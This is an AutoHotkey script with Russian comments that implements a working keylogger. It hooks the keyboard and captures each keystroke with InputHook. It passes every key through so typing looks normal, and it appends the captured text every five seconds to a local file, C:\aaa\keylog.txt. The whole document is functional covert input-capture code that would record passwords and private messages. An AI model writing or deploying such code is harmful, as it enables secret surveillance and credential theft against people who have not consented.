#NoEnv ; #Warn ;SetWorkingDir %A_ScriptDir%
#SingleInstance
;SendMode Input

#InstallKeybdHook
;#InstallMouseHook
;KeyHistory

~end::ExitApp

SetBatchLines, -1
FileAppend, , C:\aaa\keylog.txt ; Создаем файл, если он не существует.
; Переменная для хранения логов
global logData := ""
SetTimer, WriteLog, 5000

loop
{
	ih := InputHook("L1 M")
	ih.Start()
	ih.Wait()
	inputValue := ih.Input
	Send, % inputValue
	;MsgBox, %inputValue%
	logData .= inputValue
}

WriteLog:
	if (logData != "") {
		FileAppend, %logData%, C:\aaa\keylog.txt ; Записываем логи в файл и добавляем новую строку
		logData := "" ; Очищаем переменную после записи
	}
return
